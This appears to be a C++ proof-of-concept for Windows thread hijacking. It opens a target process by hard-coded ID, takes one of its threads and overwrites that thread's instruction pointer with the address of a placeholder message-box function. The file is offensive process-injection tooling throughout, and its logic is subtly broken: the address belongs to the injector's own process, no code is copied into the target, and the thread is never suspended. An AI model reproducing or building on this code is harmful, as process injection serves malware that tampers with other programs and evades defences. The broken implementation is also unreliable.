#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>

// Your injected code
void InjectedCode() {
    MessageBox(NULL, "Injected code executed!", "Injected", MB_OK);
}

DWORD GetSubThreadId(DWORD dwProcessId) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te32 = { sizeof(te32) };

    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == dwProcessId) {
                return te32.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    DWORD processId = 22956; // Replace with the ID of the target process

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process" << std::endl;
        return 1;
    }

    // Get the subthread ID of the target process
    DWORD subThreadId = GetSubThreadId(processId);
    if (subThreadId == 0) {
        std::cerr << "Failed to get subthread ID of the target process" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Open the subthread of the target process
    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, subThreadId);
    if (hThread == NULL) {
        std::cerr << "Failed to open subthread of the target process" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    CONTEXT context;
    context.ContextFlags = CONTEXT_CONTROL;

    // Get the context of the subthread
    if (!GetThreadContext(hThread, &context)) {
        std::cerr << "Failed to get context of the subthread of the target process" << std::endl;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // Set the RIP (instruction pointer) to the address of the injected code
    context.Rip = (DWORD64)InjectedCode;

    // Set the context of the subthread with the modified RIP
    if (!SetThreadContext(hThread, &context)) {
        std::cerr << "Failed to set context of the subthread of the target process" << std::endl;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Thread hijacked successfully" << std::endl;

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
